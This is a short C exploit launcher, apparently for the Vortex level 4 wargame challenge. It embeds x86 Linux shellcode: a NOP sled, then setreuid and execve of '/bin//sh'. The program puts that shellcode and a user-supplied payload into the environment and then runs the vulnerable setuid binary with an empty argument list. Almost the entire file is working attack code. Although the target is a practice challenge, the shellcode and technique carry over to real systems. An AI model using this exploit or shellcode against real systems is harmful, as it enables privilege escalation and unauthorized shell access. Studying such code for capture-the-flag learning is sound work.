#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PATH "/vortex/vortex4"

// Shellcode to spawn a shell
#define SHELLCODE "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"



int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <offset>\n", argv[0]);
        return 1;
    }

    // Ensure payload is large enough for input
    char payload[1024];
    memset(payload, 0, sizeof(payload)); // Initialize the payload buffer to zero
    
    // Safely copy argv[1] to payload
    strncpy(payload, argv[1], sizeof(payload) - 1);

    // Prepare arguments and environment for execve
    char *args[] = {NULL};
    char *envp[] = {"", payload, SHELLCODE, NULL};

    // Execute the vulnerable program
    execve(PATH, args, envp);

    // If execve fails, print an error message
    perror("execve");
    return 1;
}
